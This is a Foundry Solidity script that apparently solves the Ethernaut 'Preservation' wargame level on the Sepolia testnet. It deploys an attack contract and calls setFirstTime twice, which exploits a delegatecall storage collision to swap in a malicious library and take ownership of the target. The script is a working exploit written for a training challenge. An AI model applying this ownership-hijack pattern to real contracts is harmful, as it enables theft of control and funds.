// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

import "../src/Cracked16_Preservation.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked16_PreservationScript --broadcast
contract Cracked16_PreservationScript is Script {
    address ethernaut_contracts;
    Cracked16_Preservation attack;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("NaughtCoin_address"));
    }

    function run() public {
        vm.startBroadcast();
        attack = new Cracked16_Preservation();
        address player = vm.parseAddress(vm.envString("player"));

        IPreservation(ethernaut_contracts).setFirstTime(uint256(uint160(address(attack))));
        require(IPreservation(ethernaut_contracts).timeZone1Library() == address(attack), "first fail");
        IPreservation(ethernaut_contracts).setFirstTime(uint256(uint160(address(player))));

        require(IPreservation(ethernaut_contracts).owner() == player, "second FAIL");
        vm.stopBroadcast();
    }
}
